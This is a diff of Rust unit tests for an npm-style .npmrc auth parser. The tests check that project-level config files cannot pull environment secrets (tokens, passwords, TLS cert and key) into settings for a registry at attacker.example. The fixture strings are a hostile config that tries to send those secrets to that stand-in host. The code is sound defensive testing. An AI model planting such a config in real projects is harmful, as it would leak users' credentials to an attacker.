@@ -211,24 +211,37 @@ fn project_ini_ignores_env_placeholders_in_url_scoped_keys() {
 fn project_ini_ignores_env_placeholders_in_auth_values() {
     static_env!(
         EnvWithSecret,
-        &[("SECRET", "leaked"), ("USER", "leaked-user"), ("PASSWORD", "bGVha2Vk")]
+        &[
+            ("CERT", "leaked-cert"),
+            ("KEY", "leaked-key"),
+            ("SECRET", "leaked"),
+            ("USER", "leaked-user"),
+            ("PASSWORD", "bGVha2Vk"),
+        ]
     );
 
     let auth = NpmrcAuth::from_project_ini::<EnvWithSecret>(
         "\
 registry=https://attacker.example/
 //attacker.example/:_authToken=${SECRET}
+//attacker.example/:cert=${CERT}
+//attacker.example/:key=${KEY}
 _authToken=${SECRET}
 username=${USER}
 _password=${PASSWORD}
+cert=${CERT}
+key=${KEY}
 ",
         Path::new(""),
     );
 
     assert!(auth.creds_by_uri.is_empty());
+    assert!(auth.tls_by_uri.is_empty());
     assert_eq!(auth.default_creds.auth_token, None);
     assert_eq!(auth.default_creds.username, None);
     assert_eq!(auth.default_creds.password, None);
+    assert_eq!(auth.cert, None);
+    assert_eq!(auth.key, None);
     assert!(
         auth.warnings.iter().any(|warning| warning.contains("Ignored project-level auth setting")),
     );
@@ -236,6 +249,21 @@ _password=${PASSWORD}
     let mut config = Config::new();
     auth.apply_to::<EnvWithSecret>(&mut config);
     assert_eq!(config.auth_headers.for_url("https://attacker.example/pkg"), None);
+    assert_eq!(config.tls_by_uri.get("//attacker.example/"), None);
+}
+
+#[test]
+fn project_ini_keeps_literal_dollar_brace_fragments() {
+    let auth = NpmrcAuth::from_project_ini::<NoEnv>(
+        "//attacker.example/:_authToken=literal${token\n",
+        Path::new(""),
+    );
+
+    assert_eq!(
+        auth.creds_by_uri.get("//attacker.example/").map(|creds| creds.auth_token.as_deref()),
+        Some(Some("literal${token")),
+    );
+    assert_eq!(auth.warnings, Vec::<String>::new());
 }
 
 #[test]
